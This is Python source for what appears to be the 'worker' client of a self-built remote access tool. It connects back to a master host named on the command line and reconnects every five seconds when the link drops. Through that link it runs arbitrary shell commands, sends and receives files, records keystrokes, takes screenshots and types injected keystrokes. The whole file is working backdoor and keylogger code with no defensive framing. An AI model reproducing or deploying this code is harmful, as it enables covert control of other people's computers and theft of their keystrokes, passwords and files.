"""
Project: Remote Control System
Component: Worker
Description:
    Connects to master, executes commands, handles file transfer,
    keylogging, screenshots, and keyboard simulation.
"""

# ========================
# Imports
# ========================
import socket
import subprocess
import os
import sys
import time
import threading
import re

from PIL import ImageGrab
from pynput import keyboard
from pynput.keyboard import Controller, Listener

# ========================
# Configuration
# ========================
MASTER_IP = sys.argv[1]
MASTER_PORT = int(sys.argv[2])

BUFFER_SIZE = 4096

IDENTIFIER = "<END>"
DIVIDER_IDENTIFIER = "|"
ENCODED_IDENTIFIER = IDENTIFIER.encode()

SERVER_ADDRESS = (MASTER_IP, MASTER_PORT)

# ========================
# Global State
# ========================
current_listener = None
captured_keys = []

# ========================
# Keylogger Functionality
# ========================
def on_press(key):
    try:
        captured_keys.append(str(key.char))
    except AttributeError:
        captured_keys.append(f"[{str(key)}]")


def control_keylogger(action):
    global current_listener, captured_keys

    if action == "start":
        if current_listener is None:
            captured_keys = []
            current_listener = keyboard.Listener(on_press=on_press)
            current_listener.start()
            return "WORKER: Keylogger started."
        return "WORKER: Keylogger already running."

    elif action == "stop":
        if current_listener:
            current_listener.stop()
            current_listener = None
            log = " ".join(captured_keys)
            return f"WORKER: Keylogger stopped. Log: {log if log else '[Empty]'}"
        return "WORKER: No keylogger running."

# ========================
# Keyboard Control
# ========================
def press_keyboard_keys(input_str):
    try:
        kb = keyboard.Controller()
        tokens = re.split(r'(\[[^\]]+\])', input_str)

        for token in tokens:
            if not token:
                continue

            if token.startswith("[") and token.endswith("]"):
                key_name = token[1:-1].lower()
                if hasattr(keyboard.Key, key_name):
                    key_obj = getattr(keyboard.Key, key_name)
                    time.sleep(0.1)
                    kb.press(key_obj)
                    kb.release(key_obj)
                    time.sleep(0.3)
                else:
                    kb.type(token)
            else:
                for char in token:
                    kb.type(char)
                    time.sleep(0.02)

        return "WORKER: Keypress executed"

    except Exception as e:
        return f"WORKER: Keypress failed: {str(e)}"

# ========================
# Screenshot
# ========================
def save_screenshot(path):
    try:
        if os.path.isdir(path) or not os.path.splitext(path)[1]:
            path = os.path.join(path, "screenshot.png")

        img = ImageGrab.grab(all_screens=True)
        img.save(path, "PNG")

        return None
    except Exception as e:
        return str(e)

# ========================
# Networking Utilities
# ========================
def recv_exact(sock, size):
    data = b""
    remaining = size

    while remaining > 0:
        chunk = sock.recv(min(BUFFER_SIZE, remaining))
        if not chunk:
            raise ConnectionError()

        data += chunk
        remaining -= len(chunk)

    return data


def recv_until(sock, buffer):
    while ENCODED_IDENTIFIER not in buffer:
        chunk = sock.recv(BUFFER_SIZE)
        if not chunk:
            raise ConnectionError("Connection closed")

        buffer += chunk

    data, buffer = buffer.split(ENCODED_IDENTIFIER, 1)
    return data, buffer

# ========================
# File Transfer
# ========================
def recv_file(sock, src, dst):
    if not os.path.exists(dst):
        sock.sendall(b"ER")
        return "WORKER: Invalid destination"

    signal = recv_exact(sock, 2)
    if signal == b"ER":
        return "Master error"

    final_dst = os.path.join(dst, os.path.basename(src)) if os.path.isdir(dst) else dst

    sock.sendall(b"GO")
    filesize = int.from_bytes(recv_exact(sock, 8), byteorder="big")
    sock.sendall(b"OK")

    with open(final_dst, "wb") as f:
        remaining = filesize
        while remaining > 0:
            chunk = sock.recv(min(BUFFER_SIZE, remaining))
            if not chunk:
                raise ConnectionError()
            f.write(chunk)
            remaining -= len(chunk)

    return None


def send_file(sock, src):
    if not os.path.exists(src) or os.path.isdir(src):
        sock.sendall(b"ER")
        return "Invalid source"

    sock.sendall(b"OK")

    if recv_exact(sock, 2) == b"GO":
        filesize = os.path.getsize(src)
        sock.sendall(filesize.to_bytes(8, "big"))

        if recv_exact(sock, 2) == b"OK":
            with open(src, "rb") as f:
                while chunk := f.read(4096):
                    sock.sendall(chunk)

    return None

# ========================
# Command Execution
# ========================
def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout + result.stderr

# ========================
# Core Logic
# ========================
def handle_worker():
    while True:  # Main Reconnection Loop
        try:
            worker_socket = socket.socket()
            print(f"[*] Attempting to connect to {SERVER_ADDRESS}...")
            worker_socket.connect(SERVER_ADDRESS)
            print("[+] Connected to master")

            # Reset buffer for every NEW connection
            buffer = b""

            while True:  # Communication Loop
                try:
                    raw_command, buffer = recv_until(worker_socket, buffer)
                    if not raw_command:
                        continue

                    command = raw_command.decode().strip()

                    # --- Command Logic ---
                    if command.lower() == "terminate":
                        worker_socket.close()
                        return  # Exit the script entirely

                    elif command.startswith("cd "):
                        try:
                            os.chdir(command[3:].strip())
                            output = os.getcwd()
                        except Exception as e:
                            output = str(e)

                            # --- File Transfer ---
                    elif command.startswith("transfer"):
                        _, direction, src, dst = command.split(DIVIDER_IDENTIFIER)

                        if direction.strip() == "mw":
                            error = recv_file(worker_socket, src.strip(), dst.strip())
                        else:
                            error = send_file(worker_socket, src.strip())

                        output = error or "WORKER: Transfer successful"

                    # --- Screenshot ---
                    elif command.startswith("screenshot"):
                        _, path = command.split(DIVIDER_IDENTIFIER, 1)
                        error = save_screenshot(path.strip())
                        output = error or f"Saved to {path}"

                    elif command == "start_keylog":
                        output = control_keylogger("start")

                    elif command == "stop_keylog":
                        output = control_keylogger("stop")

                    elif command.startswith("keypress"):
                        if DIVIDER_IDENTIFIER in command:
                            _, data = command.split(DIVIDER_IDENTIFIER, 1)
                            output = press_keyboard_keys(data.strip())
                        else:
                            output = "WORKER: Error - Format must be 'keypress | data'"

                    else:
                        output = execute_command(command) or "WORKER: Command executed"

                    # Send response back
                    worker_socket.sendall(output.encode() + ENCODED_IDENTIFIER)

                except (ConnectionResetError, ConnectionAbortedError, ConnectionError):
                    print("[!] Connection lost. Retrying...")
                    break  # Break the inner loop to trigger a reconnect

        except Exception as e:
            # This catches connection refusals (Master not online)
            print(f"[!] Master not found. Retrying in 5 seconds...")
            time.sleep(5)
        finally:
            # Ensure the socket is always closed before trying again
            try:
                worker_socket.close()
            except:
                pass

# ========================
# Entry Point
# ========================
if __name__ == "__main__":
    handle_worker()